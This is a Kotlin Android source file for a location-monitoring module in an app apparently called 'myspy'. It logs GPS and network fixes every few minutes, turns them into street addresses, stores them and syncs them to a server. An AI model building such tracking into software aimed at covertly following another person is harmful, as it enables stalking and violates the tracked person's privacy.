package com.myspy.android.modules.location

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat
import com.myspy.android.data.local.db.entities.LocationEntity
import com.myspy.android.data.repository.LocationRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.Locale

/**
 * Location Monitoring Module
 * Tracks GPS location and syncs to server
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class LocationModule(
    private val context: Context,
    private val repository: LocationRepository,
    private val scope: CoroutineScope
) : LocationListener {

    companion object {
        private const val TAG = "LocationModule"
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )

        // Location update parameters
        private const val MIN_TIME_BETWEEN_UPDATES = 5 * 60 * 1000L // 5 minutes
        private const val MIN_DISTANCE_CHANGE = 50f // 50 meters
    }

    private var locationManager: LocationManager? = null
    private var geocoder: Geocoder? = null
    private var isRunning = false

    /**
     * Check if all required permissions are granted
     */
    fun hasPermissions(): Boolean {
        return REQUIRED_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Start location monitoring
     */
    fun start() {
        if (!hasPermissions()) {
            Log.w(TAG, "Missing permissions for location monitoring")
            return
        }

        if (isRunning) {
            Log.d(TAG, "LocationModule already running")
            return
        }

        Log.i(TAG, "Starting LocationModule")
        isRunning = true

        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        geocoder = Geocoder(context, Locale.getDefault())

        startLocationUpdates()
    }

    /**
     * Stop location monitoring
     */
    fun stop() {
        if (!isRunning) return

        Log.i(TAG, "Stopping LocationModule")
        isRunning = false

        locationManager?.removeUpdates(this)
        locationManager = null
    }

    /**
     * Sync collected data to server
     */
    suspend fun syncData(): Result<Int> {
        if (!hasPermissions()) {
            return Result.failure(Exception("Missing permissions"))
        }

        Log.d(TAG, "Syncing location data to server")
        return repository.syncToServer()
    }

    /**
     * Get count of unsynced locations
     */
    suspend fun getUnsyncedCount(): Int {
        return repository.getUnsyncedCount()
    }

    /**
     * Get last known location immediately
     */
    fun getLastKnownLocation() {
        if (!hasPermissions()) return

        try {
            locationManager?.let { manager ->
                // Try GPS first
                val gpsLocation = manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (gpsLocation != null) {
                    saveLocation(gpsLocation)
                    return
                }

                // Fallback to network location
                val networkLocation = manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (networkLocation != null) {
                    saveLocation(networkLocation)
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied for last known location", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting last known location", e)
        }
    }

    /**
     * Start requesting location updates
     */
    private fun startLocationUpdates() {
        try {
            locationManager?.let { manager ->
                val providers = manager.allProviders

                // Request updates from GPS if available
                if (providers.contains(LocationManager.GPS_PROVIDER)) {
                    manager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE,
                        this
                    )
                    Log.d(TAG, "Registered for GPS updates")
                }

                // Request updates from Network provider if available
                if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
                    manager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE,
                        this
                    )
                    Log.d(TAG, "Registered for Network location updates")
                }

                // Get last known location immediately
                getLastKnownLocation()
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied for location updates", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error starting location updates", e)
        }
    }

    /**
     * Called when location changes
     */
    override fun onLocationChanged(location: Location) {
        Log.d(TAG, "Location changed: ${location.latitude}, ${location.longitude}")
        saveLocation(location)
    }

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
        Log.d(TAG, "Location provider status changed: $provider, status: $status")
    }

    override fun onProviderEnabled(provider: String) {
        Log.d(TAG, "Location provider enabled: $provider")
    }

    override fun onProviderDisabled(provider: String) {
        Log.d(TAG, "Location provider disabled: $provider")
    }

    /**
     * Save location to database
     */
    private fun saveLocation(location: Location) {
        scope.launch(Dispatchers.IO) {
            try {
                // Get address from coordinates if possible
                val address = getAddressFromLocation(location.latitude, location.longitude)

                val locationEntity = LocationEntity(
                    latitude = location.latitude,
                    longitude = location.longitude,
                    accuracy = location.accuracy,
                    altitude = if (location.hasAltitude()) location.altitude else null,
                    speed = if (location.hasSpeed()) location.speed else null,
                    address = address,
                    timestamp = location.time,
                    synced = false
                )

                repository.saveLocation(locationEntity)
                Log.i(TAG, "Location saved: ${location.latitude}, ${location.longitude}")
            } catch (e: Exception) {
                Log.e(TAG, "Error saving location", e)
            }
        }
    }

    /**
     * Get human-readable address from coordinates
     */
    private fun getAddressFromLocation(latitude: Double, longitude: Double): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // For Android 13+, use the new async API (but we'll use the sync version for simplicity)
                val addresses = geocoder?.getFromLocation(latitude, longitude, 1)
                formatAddress(addresses?.firstOrNull())
            } else {
                @Suppress("DEPRECATION")
                val addresses = geocoder?.getFromLocation(latitude, longitude, 1)
                formatAddress(addresses?.firstOrNull())
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error getting address from location", e)
            null
        }
    }

    /**
     * Format address object to string
     */
    private fun formatAddress(address: Address?): String? {
        if (address == null) return null

        val parts = mutableListOf<String>()

        address.thoroughfare?.let { parts.add(it) }
        address.subThoroughfare?.let { parts.add(it) }
        address.locality?.let { parts.add(it) }
        address.adminArea?.let { parts.add(it) }
        address.countryName?.let { parts.add(it) }

        return if (parts.isNotEmpty()) parts.joinToString(", ") else null
    }
}
